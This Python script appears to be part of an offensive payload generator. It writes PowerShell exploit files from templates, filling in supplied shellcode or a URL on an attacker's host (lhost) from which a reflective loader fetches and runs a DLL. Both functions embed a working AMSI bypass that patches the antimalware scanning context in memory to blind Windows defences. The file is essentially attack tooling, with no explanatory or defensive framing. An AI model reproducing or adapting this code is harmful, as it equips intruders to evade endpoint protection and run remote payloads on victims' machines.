#!/bin/python3
import subprocess
import socket
import random
from colorama import init
from termcolor import colored

init()

def read_file(f):
        with open(f, 'r') as fs:
            content = fs.read()
        return content


def generatePsPayload(shellcode, arch):
    '''Generating PowerShell payload'''

    print(colored("[+] Generating PowerShell exploit", 'green'))

    # Adding AMSI bypass
    amsiBypass = """
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
"""



    # print(shellcode)
    # PS shellcode reflectioon runner
    template_name = "ps_reflection.ps1"
    template = read_file("templates/" + template_name)
    template = template.replace("%SHELLCODE%", shellcode)
    template = template.replace("%AMSIBYPASS%", amsiBypass)
    
    f = open(f"output/{arch}/" + template_name, 'w')
    f.write(template)
    f.close()

def generatePsDllPayload(lhost, arch):

    print(colored("[+] Generating PowerShell exploit with reflective DLL loading", 'green'))

    # Adding AMSI bypass
    amsiBypass = """
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
"""
    print(colored(f"    [!]",'red') + colored(" Create and copy managed dll to /var/html/www based on cs_dll.cs template.", 'yellow'))

    ps_text = f"http://{lhost}/ClassLibrary1.dll"

    template_name = "ps_reflective_dll.ps1"
    template = read_file("templates/" + template_name)
    template = template.replace("%PAYLOAD%", ps_text)
    template = template.replace("%AMSIBYPASS%", amsiBypass)
    
    f = open(f"output/{arch}/" + template_name, 'w')
    f.write(template)
    f.close()
